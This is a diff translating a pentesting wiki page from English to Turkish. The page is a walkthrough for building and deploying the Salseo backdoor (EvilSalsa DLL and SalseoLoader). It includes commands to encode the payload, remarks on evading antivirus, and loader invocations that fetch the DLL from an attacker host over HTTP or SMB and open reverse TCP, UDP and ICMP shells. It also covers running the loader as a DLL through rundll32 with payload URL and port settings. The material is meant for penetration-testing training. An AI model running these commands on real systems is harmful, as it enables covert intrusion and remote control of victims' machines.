@@ -2,159 +2,142 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Compiling the binaries
+## Binaries' Derlenmesi
 
-Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+Github'dan kaynak kodunu indirin ve **EvilSalsa** ile **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
 
-Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, bu mimariler için derleyin).
 
-You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
+**Mimariyi seçebilirsiniz** Visual Studio'da **sol "Build" Sekmesi** içindeki **"Platform Target"** kısmında.
 
-(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(\*\*Bu seçenekleri bulamazsanız **"Project Tab"**'ına tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
 
 ![](<../images/image (132).png>)
 
-Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlarda çalıştırılabilir dosyanın yolu görünecektir):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Prepare the Backdoor
+## Arka Kapıyı Hazırlama
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
+Öncelikle, **EvilSalsa.dll**'yi kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
-
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-
 ### Windows
-
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
+Tamam, şimdi Salseo işlemlerini gerçekleştirmek için her şeye sahipsin: **encoded EvilDalsa.dll** ve **SalseoLoader'ın binary'si.**
 
-Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**
+**SalseoLoader.exe binary'sini makineye yükle. Hiçbir antivirüs tarafından tespit edilmemelidir...**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+## **Arka kapıyı çalıştır**
 
-## **Execute the backdoor**
+### **TCP ters shell almak (HTTP üzerinden encoded dll indirme)**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
-
-Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
-
+nc'yi ters shell dinleyicisi olarak başlatmayı ve encoded evilsalsa'yı sunmak için bir HTTP sunucusu kurmayı unutma.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
+### **UDP ters shell almak (SMB üzerinden kodlanmış dll indirme)**
 
-### **Getting a UDP reverse shell (downloading encoded dll through SMB)**
-
-Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
-
+Ters shell dinleyicisi olarak bir nc başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu kurmayı unutmayın.
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
+### **ICMP ters shell almak (şifrelenmiş dll zaten kurbanın içinde)**
 
-### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
+**Bu sefer ters shell almak için istemcide özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
-
-#### **Disable ICMP Replies:**
-
+#### **ICMP Yanıtlarını Devre Dışı Bırak:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-
-#### Execute the client:
-
+#### İstemciyi çalıştırın:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-
-#### Inside the victim, lets execute the salseo thing:
-
+#### Kurbanın içinde, salseo şeyini çalıştıralım:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
+## SalseoLoader'ı ana fonksiyonu dışa aktaran DLL olarak derleme
 
-## Compiling SalseoLoader as DLL exporting main function
+SalseoLoader projesini Visual Studio ile açın.
 
-Open the SalseoLoader project using Visual Studio.
-
-### Add before the main function: \[DllExport]
+### Ana fonksiyondan önce ekleyin: \[DllExport]
 
 ![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Install DllExport for this project
+### Bu proje için DllExport'ı yükleyin
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'ye basın (ve açılan pencerede kabul edin)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
+Proje klasörünüzde **DllExport.bat** ve **DllExport_Configure.bat** dosyaları belirdi.
 
 ### **U**ninstall DllExport
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+**Kaldır**'a basın (evet, garip ama bana güvenin, bu gerekli)
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
-### **Exit Visual Studio and execute DllExport_configure**
+### **Visual Studio'dan çıkın ve DllExport_configure'ı çalıştırın**
 
-Just **exit** Visual Studio
+Sadece **çıkın** Visual Studio'dan
 
-Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
+Sonra, **SalseoLoader klasörünüze** gidin ve **DllExport_Configure.bat**'ı çalıştırın.
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+**x64**'ü seçin (eğer x64 bir kutu içinde kullanacaksanız, benim durumum buydu), **System.Runtime.InteropServices**'i seçin ( **DllExport için Ad Alanı** içinde) ve **Uygula**'ya basın.
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
-### **Open the project again with visual Studio**
+### **Projeyi tekrar Visual Studio ile açın**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport]** artık hata olarak işaretlenmemelidir.
 
 ![](<../images/image (8) (1).png>)
 
-### Build the solution
+### Çözümü derleyin
 
-Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+**Çıktı Türü = Sınıf Kütüphanesi**'ni seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıktı türü = Sınıf Kütüphanesi)
 
 ![](<../images/image (10) (1).png>)
 
-Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+**x64** **platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)
 
 ![](<../images/image (9) (1) (1).png>)
 
-To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+Çözümü **derlemek için**: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
 
-### Test the generated Dll
+### Üretilen Dll'yi test edin
 
-Copy and paste the Dll where you want to test it.
+Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.
 
-Execute:
-
+Çalıştırın:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
+Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!
 
-If no error appears, probably you have a functional DLL!!
+## DLL kullanarak bir shell alın
 
-## Get a shell using the DLL
-
-Don't forget to use a **HTTP** **server** and set a **nc** **listener**
+Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyicisi** ayarlamayı unutmayın
 
 ### Powershell
-
 ```
 $env:pass="password"
 $env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
@@ -163,9 +146,7 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-
 ### CMD
-
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -174,5 +155,4 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
 {{#include ../banners/hacktricks-training.md}}
